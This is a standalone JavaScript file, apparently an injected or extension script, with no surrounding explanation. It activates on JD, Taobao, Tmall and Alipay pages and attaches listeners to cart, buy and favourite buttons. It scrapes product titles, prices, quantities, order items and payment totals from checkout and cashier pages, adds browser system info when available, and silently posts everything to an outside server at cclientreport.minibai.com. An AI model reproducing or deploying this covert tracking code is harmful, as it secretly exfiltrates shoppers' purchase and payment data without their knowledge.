! function (w) {
  let p='',n='',gn='';
  if(!verUrl()) return;
  if (
    document.readyState === "complete" ||
    (document.readyState !== "loading" && !document.documentElement.doScroll)
  ) {
    move();
  } else {
    w.addEventListener('load', move);
  }
  function move(){
    listenShop((opts) => {
      upload_(opts);
    });
    getOrder((opts) => {
      upload_(opts);
    });
    payM();
    visitUrl();
  }
  function verUrl(){
    var domainArr = [
      'jd.com',
      'taobao.com',
      'tmall.com',
      'alipay.com'
    ];
    for(var item of domainArr){
      if(~location.host.indexOf(item)) return true;
    }
    return false;
  }
  function visitUrl(){
    var visits = [
      'detail.tmall.com',
      'item.taobao.com',
      'item.jd.com'
    ];
    for(let item of visits){
      if(~location.host.indexOf(item)){
        upload_({
          t: 10
        });
      }
    }
  }
  function listenShop(callback){
    var typeList = [{//tm
      tri: '#J_LinkBasket',
      by: '#J_LinkBuy',
      pri: '.tm-price',
      num: '.mui-amount-input',
      title: '.tb-detail-hd h1',
      collect: '#J_AddFavorite'
    },{//tb
      tri: '.J_LinkAdd',
      by: '.J_LinkBuy',
      pri: '.tb-rmb-num',
      num: '#J_IptAmount',
      title: '.tb-main-title',
      collect: '.tb-social-fav'
    },{//jd
      tri: '#InitCartUrl',
      by: '',
      pri: '.p-price',
      num: '.buy-num',
      title: '.sku-name',
      collect: '.J-follow'
    },];
    for(var i of typeList){
      var el = getEl(i.tri),el_b= getEl(i.by),el_p,el_n,el_t,el_c;
      if(el){
        el_p = getEl(i.pri);
        el_n = getEl(i.num);
        el_t = getEl(i.title);
        el_c = getEl(i.collect);
        
        p = ~location.host.indexOf('item.jd.com') ? el_p.innerText.substr(1) : el_p.innerText;
        n = el_n.value;
        gn = el_t.innerText;
        el.addEventListener('click', callback);
        if (el_b) el_b.addEventListener('click', callback);
        if (el_c) el_c.addEventListener('click', () => {
          callback({
            t: 3
          });
        });
        return;
      }
    }
  }
  function getOrder(callback){
    var visits = [
      'buy.taobao.com',
      'buy.tmall.com',
      'trade.jd.com',
    ],oid = Math.random().toString(36).substr(2),
    els = [{//tmall taobao
      tri: '#submitOrderPC_1 .go-btn',
      title: '.order-link.info-title',//innerText  '毛巾 竹纤维' s
      url: '.order-link.info-title',// href "//item.taobao.com/item.htm?id=582335188528"  s
      pri: '.info-price.info-cell',//innerText "699.00"  s
      subTotal: '.label.item-row__price-item',//innerText ""2.00""  
      num: '.quantity-inner',// num = subTotal/pri s
      totalPay: '#realPayPC_1 .realpay--price'// 订单应实付金额 innerText "748.00"
    },{//jd
      tri: '#order-submit',
      title: '#shopping-lists .goods-msg .p-name > a',//innerText  '毛巾 竹纤维' s
      url: '#shopping-lists .goods-msg .p-name > a', // href  s
      pri: '#shopping-lists .goods-msg .jd-price',//innerText "￥ 9.90"  s
      num: '#shopping-lists .goods-msg .p-num',// innerText "x1"  s
      subTotal: '',
      totalPay: '#sumPayPriceId'// 订单应实付金额 innerText "￥135.90"
    },];
    if (~visits.indexOf(location.host)) {
      let i_ = location.host === 'trade.jd.com' ? 1 : 0;
      let el = getEl(els[i_].tri);
      if (el) {
        let el_gns = getElAll(els[i_].title),
        el_us = getElAll(els[i_].url),
        el_ps = getElAll(els[i_].pri),
        el_ns = getElAll(els[i_].num),
        op = i_ ? getEl(els[i_].totalPay).innerText.substr(1) : getEl(els[i_].totalPay).innerText,
        len = el_gns.length;
        for (let i=0;len>i;i++) {
          let gn = el_gns[i].innerText,
          u = el_us[i].getAttribute('href'),
          p = i_ ? el_ps[i].innerText.substr(2) : el_ps[i].innerText,
          n = i_ ? el_ns[i].innerText.substr(1) : el_ns[i].innerText,
          data_;
          n = +n ? n : getEl('input',el_ns[i]).value;
          data_ = {
            gn, u, p, n, op, oid
          };

          setTimeout(() => {
            callback({
              t: 4,
              ...data_
            });
          },50);
        }
      }
    }
  }
  function payM(callback){
    var visits = [
      'cashiersu18.alipay.com',
      'pcashier.jd.com',
    ],els = [{//tmall taobao
      tri: '#J_authSubmit',
      pp: '.order-real-amount em' 
    },{//jd
      tri: '.pv-button a.ui-button.ui-button-XL',
      pp: '.o-price strong', //innerText  "135.90"
    }];
    if (~visits.indexOf(location.host)) {
      let i_ = location.host === 'pcashier.jd.com' ? 1 : 0,
          el = getEl(els[i_].tri) || document.querySelector(els[i_].tri);
      if (el) {
        let pp = getEl(els[i_].pp).innerText;
        upload_({
          t: 5,
          pp
        });
      }
    }
  }
  function getEl(name,parent){
    if(!name) {return null;}
    let d = parent || document;
    return d.querySelector(name);
  }
  function getElAll(name){
    if(!name) {return [];}
    return document.querySelectorAll(name);
  }
  function upload_(opts) {
    var opts = opts === event ? {} : opts;
    let url = '//cclientreport.minibai.com/sl.json',
    data = {
      u: w.location.href,
      t: 1,
      p,
      n,
      gn,
      ...opts
    };
    if(data['t'] == 5){
      delete data['u'];
    }
    if(chrome.xb && chrome.xb.getSysInfo){
      chrome.xb.getSysInfo(function(s){
        data['s'] = s;
        post({
          url,
          data
        });
      })
    }else {
      post({
        url,
        data
      });
    }
  }
  function post(options) {
    options = options || {};
    options.type = "POST";
    options.dataType = options.dataType || 'json';
    options.async = options.async || true;
    options.timeout = options.timeout || 100;
    var params = getParams(options.data),
      xhr, timeoutFlag = null;
    window.clearTimeout(timeoutFlag);
    xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4) {
        var status = xhr.status;
        if (status >= 200 && status < 300) {
          window.clearTimeout(timeoutFlag);
          options.success && options.success(xhr.responseText, xhr.responseXML);
        } else {
          window.clearTimeout(timeoutFlag);
          options.error && options.error(status);
        }
      }
    };
    xhr.open('POST', options.url, options.async);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
    timeoutFlag = window.setTimeout(function () {
      window.clearTimeout(timeoutFlag);
      xhr.abort();
    }.bind(this), options.timeout);
  }
  function getParams(data) {
    var arr = [];
    for (var param in data) {
      arr.push(encodeURIComponent(param) + '=' + encodeURIComponent(data[param]));
    }
    return arr.join('&');
  }
}(window.top);